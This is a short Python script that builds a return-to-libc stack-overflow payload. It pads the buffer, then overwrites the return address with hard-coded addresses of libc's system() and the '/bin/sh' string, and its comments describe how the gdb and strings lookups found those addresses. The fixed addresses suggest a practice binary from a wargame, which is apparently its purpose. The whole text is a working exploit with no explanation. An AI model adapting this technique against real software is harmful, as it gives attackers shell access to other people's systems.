import struct
stk= struct.pack("I",0xbffff7c4)
padding = "A"*64+"B"*4+"C"*4+"D"*4+stk
#ret= struct.pack("I",0x080484f9)
stk= struct.pack("I",0xbffff7a4)
#trap="\xcc"*100
#print padding+ret+stk+trap
system = struct.pack("I", 0xb7ecffb0)
return_after_system = "AAAA"

bin_sh = struct.pack("I",0xb7fb63bf)
#gdb>b main > run >info proc map -> libc begins at-> 0xb7e97000
#$strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"> offset of /bin/sh-> 11f3bf
#add libc beginning to /bin/sh offset to get location of bin_sh
print padding+system+return_after_system+bin_sh

